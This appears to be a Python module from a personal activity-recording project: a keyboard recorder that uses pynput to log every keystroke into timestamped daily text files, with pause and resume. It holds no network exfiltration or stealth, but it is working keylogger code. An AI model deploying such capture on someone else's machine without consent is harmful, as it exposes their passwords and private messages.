"""
Gravador de teclado.
Captura teclas digitadas e salva em arquivos de log.
"""

import threading
import time
from pathlib import Path
from pynput import keyboard
from datetime import datetime

from src.config_manager import get_config
from src.utils.logger import setup_logger
from src.utils.helpers import ensure_dir, get_today_folder, get_project_root, get_timestamp

class KeyboardRecorder:
    """Captura e armazena o que é digitado no teclado."""
    
    def __init__(self, save_interval_minutes: int = 5, on_log_ready=None):
        config = get_config()
        self.logger = setup_logger("keyboard_recorder", config.get("system.log_level", "INFO"))
        
        self.save_interval = save_interval_minutes * 60
        self.on_log_ready = on_log_ready
        
        self.root = get_project_root()
        self.data_dir = self.root / "data" / "keyboard"
        
        self.current_buffer = []
        self.listener = None
        self.running = False
        self.paused = False
        
        self._timer = None
        self._lock = threading.Lock()
        
    def _on_press(self, key):
        """Callback executado ao pressionar uma tecla."""
        if self.paused:
            return
            
        try:
            # Tentar obter o caractere
            char = None
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
            else:
                # Teclas especiais
                key_name = str(key).replace("Key.", "[") + "]"
                if key == keyboard.Key.space:
                    char = " "
                elif key == keyboard.Key.enter:
                    char = "\n"
                elif key == keyboard.Key.tab:
                    char = "\t"
                elif key == keyboard.Key.backspace:
                    char = "[BKSP]"
                else:
                    char = key_name
            
            if char:
                with self._lock:
                    self.current_buffer.append(char)
        except Exception as e:
            self.logger.error(f"Erro ao processar tecla: {e}")

    def _save_loop(self):
        """Loop periódico para salvar o buffer em arquivo."""
        while self.running:
            time.sleep(self.save_interval)
            if not self.paused:
                self.save_buffer()

    def save_buffer(self):
        """Salva o buffer atual em um arquivo."""
        with self._lock:
            if not self.current_buffer:
                return
            
            content = "".join(self.current_buffer)
            self.current_buffer = []
            
        try:
            date_folder = get_today_folder()
            save_dir = ensure_dir(self.data_dir / date_folder)
            
            # Usar um único arquivo por dia para facilitar a análise, 
            # ou múltiplos? O usuário pediu "salvando por tempo".
            # Vamos salvar anexando a um arquivo 'keylog.txt' do dia.
            log_file = save_dir / "keylog.txt"
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            header = f"\n--- [{timestamp}] ---\n"
            
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(header + content + "\n")
            
            self.logger.debug(f"Log de teclado salvo em {log_file}")
            
            if self.on_log_ready:
                self.on_log_ready(log_file)
                
        except Exception as e:
            self.logger.error(f"Erro ao salvar log de teclado: {e}")

    def start(self):
        """Inicia a captura."""
        if self.running:
            return
            
        self.running = True
        self.paused = False
        
        # Iniciar listener
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        
        # Iniciar thread de salvamento
        self._timer = threading.Thread(target=self._save_loop, daemon=True)
        self._timer.start()
        
        self.logger.info("Gravador de teclado iniciado")

    def stop(self):
        """Para a captura."""
        self.running = False
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        # Salvar buffer final
        self.save_buffer()
        self.logger.info("Gravador de teclado encerrado")

    def pause(self):
        """Pausa a captura."""
        self.paused = True
        self.logger.info("Gravador de teclado pausado")

    def resume(self):
        """Retoma a captura."""
        self.paused = False
        self.logger.info("Gravador de teclado retomado")
